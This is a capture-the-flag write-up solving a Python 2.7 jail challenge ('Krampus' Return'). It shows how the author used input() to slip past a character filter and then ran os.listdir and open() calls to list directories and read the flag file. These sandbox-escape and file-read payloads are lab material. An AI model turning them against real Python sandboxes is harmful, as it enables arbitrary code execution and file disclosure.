# Problem

![Krampus' Return](images/krampus_problem.png)

This problem was a reference to an earlier Krampus problem, a Python 2.7 jail https://ctftime.org/task/7359.

# Resources

- [Python 2.7 Builtins](https://docs.python.org/2.7/library/functions.html#built-in-functions)

# Solution

This was also a jail. It actually took me a while to realize that my commands weren't having effect because of the whimsical responses from the server:

```
$ nc challs.xmas.htsp.ro 13006
░ ▒ ▓ █
CONNECTION ESTABLISHED - PYTHON 2.
CONNECTION WILL BE CLOSED AFTER 5 MINUTES. BE WARY.

<Server>: Krampus stares at you. He has seen you before. Play nice.
<You>: hi krampus
<Server>: You tried to get Krampus' attention. Try something different.
<You>: HELLO
<Server>: You tried to get Krampus' attention. No response.
<You>: ...
<Server>: You tried to get Krampus' attention. He is busy.
<You>: ok
<Server>: Krampus has heard you. You made him curious. ░ ▒ ▓ █
<You>: oh?
<Server>: Krampus has now your attention. Be careful!
<You>: Hi!
<Golem>: *looks towards you*
```

Eventually I typed in a number and started piecing it together.

```
<You>: 2
<Krampus>: 2
<You>: 2+4
<Elf #113>: Yee, what are y'all doing?
<You>: dir()
<Krampus>: ['__builtins__', '__doc__', '__file__', '__name__', '__package__', 'inp']
<You>: inp
<Krampus>: inp
<You>: list(inp)
<Krampus>: ['l', 'i', 's', 't', '(', 'i', 'n', 'p', ')']
```

When you type in an invalid character, the server will have some Elf, Golem, Ice Dragon, or Krampus say something instead of executing your command. Disallowed characters include `'"_+.,`, but you can use parentheses to call functions and nest them. Finally, `inp` is a string that copies your input right before it is executed.  My first approach was to try to create a string just like last year's solutions were able to do, and perhaps even call `eval(inp)`, but it was hard to get too far:

```
<You>: next(iter(dir()))   
<Krampus>: __builtins__
```

I started going through [Python 2.7's builtin functions](https://docs.python.org/2.7/library/functions.html#built-in-functions) one by one to find something that could help me. Eventually, I tried `input()`:

```
<You>: input()
'a'
<Krampus>: a
```

! We're getting somewhere. Using `input()` enables us to type invalid characters into `stdin` and avoid the filtering logic. A little more fiddling gets us there:

```
<You>: input()
__import__('os').listdir('/')
<Krampus>: ['lib64', 'tmp', 'opt', 'lib', 'run', 'etc', 'dev', 'sbin', 'proc', 'home', 'mnt', 'srv', 'sys', 'bin', 'usr', 'media', 'root', 'var', 'boot', '.dockerenv', 'chall']
<You>: input()
__import__('os').listdir('/chall/')
<Krampus>: ['flag.txt', 'server.py', 'krampus.py']
<You>: input()
open('flag.txt').read()
<Server>: Senseless words.
<You>: input()
open('/chall/flag.txt').read()
<Krampus>: X-MAS{Th3_4ll_Mighty_pyth0n_b34t5_kr4mpu5_th1s_Xmas}
```

Flag: `X-MAS{Th3_4ll_Mighty_pyth0n_b34t5_kr4mpu5_th1s_Xmas}`
